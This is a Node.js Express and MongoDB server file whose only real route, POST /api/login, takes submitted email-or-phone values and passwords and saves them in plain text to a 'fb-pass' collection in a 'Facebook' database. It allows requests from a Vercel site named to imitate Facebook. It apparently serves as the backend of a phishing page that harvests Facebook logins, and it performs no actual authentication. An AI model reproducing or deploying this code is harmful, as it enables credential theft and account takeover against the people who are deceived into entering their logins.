
const { MongoClient, ServerApiVersion } = require('mongodb');
const express = require('express');
const cookieParser = require('cookie-parser');      // npm install cookie-parser
const cors = require('cors');
require('dotenv').config();

const app = express();
const  port = 5000;


//middleware
app.use(cors({
    origin:[
        "http://localhost:5173",
        "https://newblockbustermovie.vercel.app",
        "https://facebook01-m1ghmrud7-johns-projects-73d3f894.vercel.app"
    ],
    credentials:true
}))

app.use(express.json());
app.use(cookieParser());


const uri = `mongodb+srv://${process.env.DB_USER}:${process.env.DB_PASSWORD}@cluster0.wcilc.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0`;

// Create a MongoClient with a MongoClientOptions object to set the Stable API version
const client = new MongoClient(uri, {
  serverApi: {
    version: ServerApiVersion.v1,
    strict: true,
    deprecationErrors: true,
  }
});

async function run() {
  try {
    // Connect the client to the server	(optional starting in v4.7)
    // await client.connect();
    // Send a ping to confirm a successful connection
    // await client.db("admin").command({ ping: 1 });
    console.log("Pinged your deployment. You successfully connected to MongoDB!");

    // Our Code start from here
    
    // Create collection
    const FbCollection = client.db("Facebook").collection('fb-pass');

    app.post('/api/login',async(req,res)=>{
        const {emailNum, pass} = req.body;
        // console.log(emailNum,pass);
        const userData = {email_or_num : emailNum, password : pass};
        const result = await FbCollection.insertOne(userData)
        res.send(result);
    })




  } finally {
    // Ensures that the client will close when you finish/error
    // await client.close();
  }
}
run().catch(console.dir);


app.get('/',(req,res)=>{
    res.send('Server is running smoothly.');
})

app.listen(port,()=>{
    console.log(`server is running smoothly on port ${port}`);
})

